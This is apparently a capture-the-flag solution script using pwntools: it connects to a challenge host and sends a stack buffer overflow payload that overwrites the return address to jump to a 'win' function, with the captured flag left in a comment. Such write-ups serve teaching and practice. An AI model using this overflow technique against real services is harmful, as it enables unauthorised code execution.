from pwn import *

p= remote("chal.78727867.xyz", 9999)

win_add=p64(0x00000000004011b6) #win
ret_add=p64(0x000000000040101a)
payload=b"A"*72+ret_add+win_add
p.sendlineafter(b"o:", payload)
p.interactive()
p.close()
#NHNC{CLANNAD_1s_g00d_anim3_and_you_kn0w_BOF}
